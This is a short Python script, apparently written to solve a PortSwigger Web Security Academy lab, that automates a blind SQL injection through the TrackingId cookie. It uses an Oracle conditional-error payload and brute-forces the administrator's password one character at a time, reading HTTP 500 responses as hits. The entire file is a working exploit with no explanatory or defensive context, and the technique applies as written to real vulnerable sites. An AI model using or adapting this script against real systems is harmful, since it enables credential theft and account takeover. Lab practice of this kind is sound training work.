#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig,frame):
    print("\n\n[!] Saliendo...")
    sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT,def_handler)

main_url = "https://0a3300480434593880ae85f0008f00c6.web-security-academy.net"
characters = string.ascii_lowercase + string.digits

def makeRequest():

    password = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(1, 21):
        for character in characters:

            cookies = {
                'TrackingId': "TrackingId=0QJboHfQzfXCrc0k'||(select case when substr(password,%d,1)='%s' then to_char(1/0) else '' end from users where username='administrator')||'" % (position, character),
                'session': "T56s1qvBURKTk7iPBi4CUH4YNrXHGz9h"            
            }

            p1.status(cookies['TrackingId'])

            r = requests.get(main_url, cookies=cookies)

            if r.status_code == 500:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':

    makeRequest()
